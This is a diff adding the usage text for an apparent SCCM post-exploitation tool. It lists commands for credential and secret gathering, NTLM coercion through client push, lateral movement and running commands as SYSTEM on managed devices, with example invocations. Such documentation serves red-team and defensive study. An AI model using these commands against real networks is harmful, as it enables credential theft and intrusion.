@@ -1,0 +1,51 @@
+ABOUT
+    Post exploitation tool for Microsoft Endpoint Configuration Manager (SCCM).
+    Supports lateral movement, credential gathering, and abuse of client push
+    installation for NTLM coercion.
+
+USAGE:
+    net-sharp-sccm --- <command> [subcommand] [options]
+
+COMMANDS:
+    deob            Deobfuscate a policy secret hex string
+    exec            Execute command/binary on client or coerce NTLM auth
+    get             Fetch objects from SMS Provider, management point, or DC
+    invoke          Execute actions on SMS Provider
+    local           Interact with local SCCM client
+    new             Create SCCM objects (applications, collections, deployments)
+    remove          Delete SCCM objects
+
+GET SUBCOMMANDS:
+    admins, applications, classes, class-instances, class-properties
+    collections, collection-members, collection-rules, deployments
+    devices, primary-users, resource-id, secrets, site-info
+    site-push-settings, software, users
+
+INVOKE SUBCOMMANDS:
+    admin-service   CMPivot query against clients
+    client-push     Coerce NTLM auth from site server
+    query           Execute WQL query on SMS Provider
+    update          Force clients to check for updates
+
+LOCAL SUBCOMMANDS:
+    classes, class-instances, class-properties, client-info
+    create-ccr, grep, push-logs, query, secrets, site-info
+    triage, user-sid
+
+EXEC OPTIONS:
+    --device, -d          Target device ResourceName
+    --collection-id, -i   Target collection ID
+    --collection-name, -n Target collection name
+    --path, -p            Command or UNC path to execute
+    --run-as-system, -s   Execute as SYSTEM
+    --user, -u            Target username
+    --site-code, -sc      Three character site code
+    --sms-provider, -sms  SMS Provider hostname
+    --relay-server, -r    NTLM relay/capture server
+
+EXAMPLES:
+    net-sharp-sccm --- local client-info
+    net-sharp-sccm --- get devices --sms-provider sms01.corp.local
+    net-sharp-sccm --- get secrets
+    net-sharp-sccm --- exec --device WORKSTATION01 --path "powershell whoami"
+    net-sharp-sccm --- invoke client-push --target 192.168.1.100
